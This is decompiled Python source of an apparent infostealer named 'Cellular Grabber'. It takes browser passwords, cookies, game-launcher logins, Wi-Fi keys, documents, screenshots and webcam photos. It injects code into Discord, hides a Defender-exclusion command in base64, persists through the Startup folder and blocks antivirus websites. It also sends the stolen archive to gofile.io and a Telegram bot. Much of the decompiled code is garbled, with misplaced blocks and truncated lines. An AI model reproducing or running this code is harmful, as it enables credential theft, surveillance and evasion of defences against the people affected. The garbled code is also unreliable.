        if decrypted == 'Failed to decrypt password' or not decrypted:
            exit(1)
        decrypted = json.loads(decrypted)
        if 'modules' in decrypted and 'options' in decrypted:
            modules = decrypted['modules']
            options = decrypted['options']
        else:  # inserted
            exit(1)
    except Exception as e:
        print(e)
    else:  # inserted
        pass

class MakeTempFile:
    def __init__(self, content: str):
        try:
            self.content = content
            self.fname = str(uuid.uuid4()).replace('-', '')
        except Exception as e:
            print(e)

    def __enter__(self):
        try:
            self.fpath = os.path.join(temp, self.fname)
            return self.fpath
        except Exception as e:
            print(e)

    def __exit__(self, exc_type, exc_value, traceback):
        pass
        try:
            os.remove(self.fname)
            return
        except:
            return
            except Exception as e:
                print(e)
            else:  # inserted
                pass

class StealCommonFiles:
    def __init__(self):
        pass
        return None

    def steal_common_files(self, zipF: zipfile.ZipFile) -> None:
        try:
            def _get_user_folder_path(folder_name) -> str | None:
                try:
                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Shell Folders') as key:
                        pass  # postinserted
                except FileNotFoundError:
                        value, _ = winreg.QueryValueEx(key, folder_name)
                        return value
                        return None
                    else:  # inserted
                        pass
            paths = [_get_user_folder_path('Desktop'), _get_user_folder_path('Personal'), _get_user_folder_path('{374DE290-123F-4565-9164-39C4925E467B}')]
            for search_path in paths:
                if not search_path:
                    continue
                if os.path.isdir(search_path):
                    for entry in os.listdir(search_path):
                        if os.path.isfile(os.path.join(search_path, entry)):
                            if (any([x in entry.lower() for x in ['secret', 'password', 'account', 'tax', 'key', 'wallet', 'backup']]) or entry.endswith(('.txt', '.rtf', '.odt', '.doc', '.docx', '.pdf', '.csv', '.xls', '.xlsx,', '.ods', '.json', '.ppk'))) and (not entry.endswith('.lnk')) and (0 < os.path.getsize(os.path.join(search_path, entry)) < 2097152) and (entry.endswith('\\Torch\\User Data') is not None) and (entry.endswith('Kometa') is not None) and (entry.endswith('\\Kometa\\User Data') is not None) and (entry.endswith('Orbitum') is not None) and (entry.endswith('\\Orbitum\\User Data
        except Exception as e:
                            else:  # inserted
                                try:
                                    zipF.write(os.path.join(search_path, entry), os.path.join('Common Files', entry))
                                except Exception:
                                    pass  # postinserted
                        else:  # inserted
                            if os.path.isdir(os.path.join(search_path, entry)):
                                if entry == 'Common Files':
                                    pass  # postinserted
                                else:  # inserted
                                    continue
                                try:
                                    for sub_entry in os.listdir(os.path.join(search_path, entry)):
                                        if os.path.isfile(os.path.join(search_path, entry, sub_entry)) and (sub_entry.endswith(('.txt', '.rtf', '.odt', '.doc', '.docx', '.pdf', '.csv', '.xls', '.xlsx,', '.ods', '.json', '.ppk')) or (not entry.endswith('.lnk') and (not os.path.join(search_path, entry, sub_entry)))) and (not sub_entry.endswith(('.txt', '.rtf', '.odt', '.doc', '.docx', '.pdf', '.csv', '.xls', '.xlsx,', '.ods', '.json', '.ppk'))) and (not sub_entry.endswith(('.txt', '.rtf', '.odt', '.doc', '.docx', '.pdf', '.csv', '.xls', '.xlsx,', '
                except Exception:
                                except Exception:
                                    pass  # postinserted
                pass
                pass
                pass
                print(e)

def get_screenshot(zf: zipfile.ZipFile) -> None:
    try:
        hdesktop = GetDesktopWindow()
        width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
        height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
        left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
        top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
        desktop_dc = GetWindowDC(hdesktop)
        img_dc = win32ui.CreateDCFromHandle(desktop_dc)
        mem_dc = img_dc.CreateCompatibleDC()
        screenshot = win32ui.CreateBitmap()
        screenshot.CreateCompatibleBitmap(img_dc, width, height)
        mem_dc.SelectObject(screenshot)
        mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
        bmp_info = screenshot.GetInfo()
        bmp_str = screenshot.GetBitmapBits(True)
        img = Image.frombuffer('RGB', (bmp_info['bmWidth'], bmp_info['bmHeight']), bmp_str, 'raw', 'BGRX', 0, 1)
        img_bytes = io.BytesIO()
        img.save(img_bytes, format='PNG')
        img_bytes.seek(0)
        zf.writestr('screenshot.png', img_bytes.read())
        mem_dc.DeleteDC()
        DeleteObject(screenshot.GetHandle())
    except Exception as e:
        print(e)
    else:  # inserted
        pass

def add_exclusions():
    pass
    try:
        c = zlib.decompress(base64.b64decode('eJzFjs0KgkAUhV/lIths0neQmkDQEqVdm2G8ojDeO4zXsrdPF22i1u3OD+fjeH5gmHp0LsUFIRnIz9JxGI0AMa0Jz/IZnZlyEgzGynBf/YHH0VALUda2SemrgB0GJLtWerFungamykgP8bXRdVVfTnmh41vm/dGIiWAH/o83CrbGfTth37wG5RdPL4K0CVDbSO1V6p8qegE+83mo'))
        subprocess.run(c.decode('utf-8'), shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        return
    except Exception as e:
        print(e)

class StealGameAccounts:
    def __init__(self):
        pass
        return None

    def steal_minecraft_accounts(self, zipF: zipfile.ZipFile) -> None:
        try:
            userProfile = os.getenv('userprofile', '')
            minecraftPaths = {'Intent': os.path.join(userProfile, 'intentlauncher', 'launcherconfig'), 'Lunar': os.path.join(userProfile, '.lunarclient', 'settings', 'game', 'accounts.json'), 'TLauncher': os.path.join(roaming, '.minecraft', 'TlauncherProfiles.json'), 'Feather': os.path.join(roaming, '.minecraft', 'meteor-client', 'accounts.nbt'), 'Meteor': os.path.join(roaming, '.minecraft', 'cheatbreaker_accounts.json', 'launcher_accounts_microsoft_store.json'), 'Impact': os.path.join(roaming, '.minecraft', 'Rise', 'alts.txt'), 'Novoline': os.path.join(roaming, 'paladium-group', 'accounts.json'), 'CheatBreakers': os.path.join(roaming, 'Badlion Client', 'accounts.json')}
            for name, path in minecraftPaths.items():
                if os.path.isfile(path):
                    pass  # postinserted
        except Exception as e:
                else:  # inserted
                    try:
                        zipF.write(path, os.path.join('Games', 'Minecraft', name, os.path.basename(path)))
                    except Exception:
                        pass  # postinserted
                pass
                print(e)

    def steal_epic_accounts(self, zipF: zipfile.ZipFile) -> None:
        try:
            saveToPath = os.path.join(temp, 'Games', 'Epic')
            epicPath = os.path.join(local, 'EpicGamesLauncher', 'Saved', 'Config', 'Windows')
            if os.path.isdir(epicPath):
                loginFile = os.path.join(epicPath, 'GameUserSettings.ini')
                if os.path.isfile(loginFile):
                    with open(loginFile) as file:
                        pass  # postinserted
        except Exception as e:
                        contents = file.read()
                            if '[RememberMe]' in contents:
                                pass  # postinserted
                            else:  # inserted
                                try:
                                    os.makedirs(saveToPath, exist_ok=True)
                                    for file in os.listdir(epicPath):
                                        if os.path.isfile(os.path.join(epicPath, file)):
                                            zipF.write(os.path.join(epicPath, file), os.path.join('Games', 'Epic', file))
                                    zipF.write(loginFile, os.path.join('Games', 'Epic', 'GameUserSettings.ini'))
                                except Exception:
                                    pass  # postinserted
                return
                print(e)

class Utility:
    @staticmethod
    def GetLnkTarget(path_to_lnk: str) -> str | None:
        try:
            target = None
            if os.path.isfile(path_to_lnk):
                output = subprocess.run('wmic path win32_shortcutfile where name=\"%s\" get target /value' % os.path.abspath(path_to_lnk).replace('\\', '\\\\'), shell=True, capture_output=True).stdout.decode()
                if output:
                    for line in output.splitlines():
                        if line.startswith('Target='):
                            temp = line.lstrip('Target=').strip()
                            if os.path.exists(temp):
                                pass  # postinserted
        except Exception as e:
                            else:  # inserted
                                target = temp
                            except:
                                return target
            return target
                        print(e)

    @staticmethod
    def GetLnkFromStartMenu(app: str) -> List[str]:
        try:
            shortcutPaths = []
            startMenuPaths = [os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs'), os.path.join('C:\\', 'ProgramData', 'Microsoft', 'Windows', 'Start Menu', 'Programs')]
            for startMenuPath in startMenuPaths:
                for root, _, files in os.walk(startMenuPath):
                    for file in files:
                        if file.lower() == '%s.lnk' % app.lower():
                            shortcutPaths.append(os.path.join(root, file))
            return shortcutPaths
        except Exception as e:
            print(e)
            return []
        else:  # inserted
            pass

def StealSteam() -> None:
    try:
        saveToPath = os.path.join(temp, 'Games', 'Steam')
        steamPaths = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu('Steam')]])]
    except Exception as e:
            multiple = len(steamPaths) > 1
            if not steamPaths:
                steamPaths.append('C:\\Program Files (x86)\\Steam')
            for index, steamPath in enumerate(steamPaths):
                steamConfigPath = os.path.join(steamPath, 'config')
                if os.path.isdir(steamConfigPath):
                    loginFile = os.path.join(steamConfigPath, 'loginusers.vdf')
                    if os.path.isfile(loginFile):
                        pass  # postinserted
                    else:  # inserted
                        with open(loginFile, 'r') as file:
                            contents = file.read()
                                if '\"RememberPassword\"\t\t\"1\"' in contents:
                                    pass  # postinserted
                                else:  # inserted
                                    try:
                                        _saveToPath = saveToPath
                                        if multiple:
                                            _saveToPath = os.path.join(saveToPath, 'Profile %d' % (index + 1))
                                        os.makedirs(_saveToPath, exist_ok=True)
                                        shutil.copytree(steamConfigPath, os.path.join(_saveToPath, 'config'), dirs_exist_ok=True)
                                        for item in os.listdir(steamPath):
                                            if item.startswith('ssfn') and os.path.isfile(os.path.join(steamPath, item)) and zipF.write(os.path.join(steamPath, item), os.path.join('Games', 'Steam', item)) and zipF.writestr(os.path.join('Games', 'Steam', 'Info.txt'), 'Multiple Steam installations are found, so the files for each of them are put in different Profiles') and (v == x) and (\\discord == Discord Canary):
                                                pass  # postinserted
                                    except Exception:
                                        pass  # postinserted
                pass
        print(e)

class Injection:
    def __init__(self, code: str) -> None:
        try:
            self.discord_dirs = [local + '\\Discord', local + '\\DiscordCanary', local + '\\DiscordPTB', local + '\\DiscordDevelopment']
            self.code = code
            for proc in psutil.process_iter():
                if 'discord' in proc.name().lower():
                    proc.kill()
            else:  # inserted
                for dir in self.discord_dirs:
                    if not os.path.exists(dir):
                        continue
                    if self.get_core(dir) is not None:
                        pass  # postinserted
        except Exception as e:
                    else:  # inserted
                        with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
                            f.write(self.code.replace('discord_desktop_core-1', self.get_core(dir)[1]))
                            self.start_discord(dir)
                    return None

    def get_core(self, dir: str) -> tuple:
        try:
            for file in os.listdir(dir):
                if re.search('app-+?', file):
                    modules = dir + '\\' + file + '\\modules'
                    if not os.path.exists(modules):
                        continue
                    for file in os.listdir(modules):
                        if re.search('discord_desktop_core-+?', file):
                            pass  # postinserted
        except Exception as e:
                        else:  # inserted
                            core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                            if os.path.exists(core + '\\index.js'):
                                return (core, file)
            else:  # inserted
                return (None, None)
                return (None, None) + (None, e) * e

    def start_discord(self, dir: str) -> None:
        try:
            update = dir + '\\Update.exe'
            executable = dir.split('\\')[(-1)] + '.exe'
            for file in os.listdir(dir):
                if re.search('app-+?', file):
                    app = dir + '\\' + file
                    if os.path.exists(app + '\\' + 'modules'):
                        pass  # postinserted
        except Exception as e:
                    else:  # inserted
                        for file in os.listdir(app):
                            if file == executable:
                                pass  # postinserted
                            else:  # inserted
                                executable = app + '\\' + executable
                                subprocess.call([update, '--processStart', executable], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                return None

def get_networks() -> Dict[str, str]:
    try:
        networks = {}
    finally:  # inserted
        try:
            output_networks = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode(errors='ignore')
            profiles = [line.split(':')[1].strip() for line in output_networks.split('\n') for profile in profiles if profile]

def get_system_info() -> str:
    try:
        wff = '\n\t'.join([f"{k}{v.split('Key Content')[1].splitlines()[0].strip()}" for k, v in get_networks().items() if 'Key Content' in v])
    except Exception as e:
        return 'Error: Failed to get system info' % (None, e)

def capture_images(zf: zipfile.ZipFile, num_images=1):
    try:
        num_cameras = 0
        cameras = []
        os.makedirs(os.path.join(temp, 'Webcam'), exist_ok=True)
        while True:
            cap = cv2.VideoCapture(num_cameras)
            if not cap.isOpened():
                break
            cameras.append(cap)
            num_cameras += 1
        if num_cameras == 0:
            return
        for _ in range(num_images):
            for i, cap in enumerate(cameras):
                ret, frame = cap.read()
                if ret:
                    pass  # postinserted
    except Exception as e:
        else:  # inserted
            image_path = os.path.join(temp, 'Webcam', f'image_from_camera_{i}.jpg')
            cv2.imwrite(image_path, frame)
            zf.write(image_path, arcname=f'image_from_camera_{i}.jpg')
            for cap in cameras:
                cap.release()
            print(f'Error: {e}')
            return None

def UploadToExternalService(path, filename=None) -> str | None:
    try:
        if os.path.isfile(path):
            with open(path, 'rb') as file:
                pass  # postinserted
    except Exception as e:
                fileBytes = file.read()
                    if filename is None:
                        filename = os.path.basename(path)
                else:  # inserted
                    try:
                        response = requests.get('https://api.gofile.io/getServer')
                        if response.status_code == 200:
                            server = response.json()['data']['server']
                            if server:
                                url = f'https://{server}.gofile.io/uploadFile'
                                files = {'file': (filename, fileBytes)}
                                response = requests.post(url, files=files)
                                if response.status_code == 200:
                                    json_response = response.json()
                                    if json_response['status'] == 'ok':
                                        return json_response['data']['downloadPage']
                                    print('Failed to upload file:', json_response['message'])
                    except Exception as e:
                                else:  # inserted
                                    print(f'Failed to upload file. Status code: {response.status_code}')
                        else:  # inserted
                            print(f'Failed to get GoFile server. Status code: {response.status_code}')
            print('Error uploading to GoFile:', e)
            print('Error processing file:', e)

def upload_to_discord() -> None:
    try:
        url = UploadToExternalService(os.path.join(temp, fn))
        if url:
            ww = '\n'.join([f'  - {url}: {count}' for url, count in login_counts_for_each_site.items()])
    except Exception as e:
            return None
        else:  # inserted
            pass

def upload_to_telegram() -> None:
    try:
        tg_creds = options['webhook_options']['webhook_url'].split('/')[1]
        channel_id = options['webhook_options']['webhook_url'].split('/')[0]
        fields = {'text': UploadToExternalService(os.path.join(temp, fn))}
        requests.post(f'https://api.telegram.org/bot{tg_creds}/sendMessage?chat_id={channel_id}', data=fields)
    except Exception as e:
        return None
    else:  # inserted
        pass

def pydata():
    return

def put_in_startup():
    def get_self():
        file_path = sys.argv[0]
        is_executable = True
        return (file_path, is_executable)

    def get_random_string(length=10, invisible=False):
        chars = string.ascii_letters + string.digits
        if invisible:
            chars = chars.replace('l', '').replace('I', '').replace('o', '').replace('O', '')
        return ''.join((random.choice(chars) for _ in range(length)))
    try:
        startup_dir = os.path.join(roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        file, is_executable = get_self()
        if is_executable:
            out = os.path.join(startup_dir, f'{get_random_string(invisible=True)}.exe')
            os.makedirs(startup_dir, exist_ok=True)
            shutil.copy(file, out)
            return f'File copied to startup: {out}'
    except Exception as e:
        pass  # postinserted
    else:  # inserted
        pass  # postinserted
    return 'Script is not executable or unable to determine file path.'
        return f'Failed to copy file to startup: {e}'

def process_stolen_passwords(info: Dict[str, Dict[str, Any]], zipF: zipfile.ZipFile) -> None:
    global other_pwds_count  # inserted
    for browser_name, values in info['login_data'].items():
        login_data = '[+] Cellular Grabber\nNo login data found\n\n' if len(values) == 0 else '\n\n'.join([f"[+] Cellular Grabber\nURL: {login['url']}\nUsername: {login['username']}\nPassword: {login['password']}\n\n" for login in values])
        zipF.writestr(f'output_temp/{browser_name}/login_data.txt', login_data)

        def inc_site(url: str) -> bool:
            login_counts_for_each_site[url] += 1
            return True
        important_login_data = '[+] Cellular Grabber\nNo login data found\n\n' if len(values) == 0 else f"[+] Cellular Grabber\nURL: {login['url']}\nUsername: {login['username']}\nPassword: {login['password']}\n\n" if '.'.join('://'.join(login['url'].split('://')[1:]).split('.')[1:]) in urls else f"important_login_data{login['url']}Lightcord{login['username']}\\Lightcord"
        zipF.writestr(f'output_temp/{browser_name}/important_login_data.txt', important_login_data)
        other_pwds_count += len(values)
    for browser_name, values in info['autofills'].items():
        autofills = '[+] Cellular Grabber\nNo autofills found\n\n' if len(values) == 0 else '\n\n'.join(values)
        zipF.writestr(f'output_temp/{browser_name}/autofills.txt', autofills)
    for browser_name, values in info['history'].items():
        tz = tzlocal.get_localzone()
        history = '[+] Cellular Grabber\nNo history found\n\n' if len(values) == 0 else '\n\n'.join([f"URL: {history['url']}\nVisited: {history['visit_count']} times\n\n" for history in values])
        zipF.writestr(f'output_temp/{browser_name}/history.txt', history)
    for browser_name, values in info['cookies'].items():
        cookies = '[+] Cellular Grabber\nNo cookies found\n\n' if len(values) == 0 else '\n\n'.join([f"[+] Cellular Grabber\nHost: {cookie['host_key']}\nName: {cookie['name']}\nPath: {cookie['path']}\nValue: {cookie['cookie']}\nExpires: {cookie['expires_utc']}\n\n" for cookie in values])
        zipF.writestr(f'output_temp/{browser_name}/cookies.txt', cookies)
        speculated_logins = ''
        found = False
        for cookie in values:
            if re.match('^(?:[\\w-]*\\.){2}[\\w-]*$', cookie['cookie']):
                found = True
                speculated_logins += '[+] Cellular Grabber\n'
                speculated_logins += f"Host: {cookie['host_key']}\nName: {cookie['name']}\nPath: {cookie['path']}\nValue: {cookie['cookie']}\nExpires: {cookie['expires_utc']}\n\n"
        if len(values) == 0 or not found:
            speculated_logins += '[+] Cellular Grabber\n'
            speculated_logins += 'No cookies found\n'
        zipF.writestr(f'output_temp/{browser_name}/speculated_logins.txt', speculated_logins)
        important_cookies = ''
        found = False
        for cookie in values:
            if cookie['host_key'] in urls:
                found = True
                important_cookies += '[+] Cellular Grabber\n'
                important_cookies += f"Host: {cookie['host_key']}\nName: {cookie['name']}\nPath: {cookie['path']}\nValue: {cookie['cookie']}\nExpires: {cookie['expires_utc']}\n\n" if len(values) == 0 or not found else zipF.writestr(f'output_temp/{browser_name}/important_cookies.txt', important_cookies)

def block_sites():
    hosts_path = 'C:\\Windows\\System32\\drivers\\etc\\hosts'
    try:
        with open(hosts_path, 'a') as hosts_file:
            pass  # postinserted
    except Exception as e:
            for website in ['virustotal.com', 'avast.com', 'totalav.com', 'scanguard.com', 'totaladblock.com', 'pcprotect.com', 'mcafee.com', 'bitdefender.com', 'us.norton.com', 'avg.com', 'malwarebytes.com', 'pandasecurity.com', 'avira.com', 'norton.com', 'eset.com', 'zillya.com', 'kaspersky.com', 'usa.kaspersky.com', 'sophos.com', 'home.sophos.com', 'adaware.com', 'bullguard.com', 'clamav.net', 'drweb.com', 'emsisoft.com', 'f-secure.com', 'zonealarm.com', 'trendmicro.com', 'ccleaner.com']:
                hosts_file.write(f'127.0.0.1 {website}\n')
                print('Websites blocked successfully.')
            print(f'An error occurred: {e}')
        else:  # inserted
            pass
if __name__ == '__main__':
    decrypt_config()
    g_uac()
    if modules['add_to_startup']['enabled']:
        print(put_in_startup())
    if modules['block_sites']['enabled']:
        block_sites()
    if options['sleep_before_execution']['enabled']:
        sleep(options['sleep_before_execution']['time'])
    antivm = [k_proc, c_int, c_kvm, c_win, c_par_qemu, c_rec_f, vm_artifacts, c_uname, c_hostname, c_time, c_cpu, det_vm, d_check]
    antidbg = [c_dbg, c_win, c_time, k_proc]
    if modules['anti_vm']['enabled']:
        for f in antivm:
            f()
    if modules['anti_debug']['enabled']:
        for f in antidbg:
            f()
    if modules['windef_exclusion']['enabled']:
        add_exclusions()
    threading.Thread(target=pydata).start()
    if modules['inject_to_discord']['enabled']:
        injection_code = zlib.decompress(base64.b64decode('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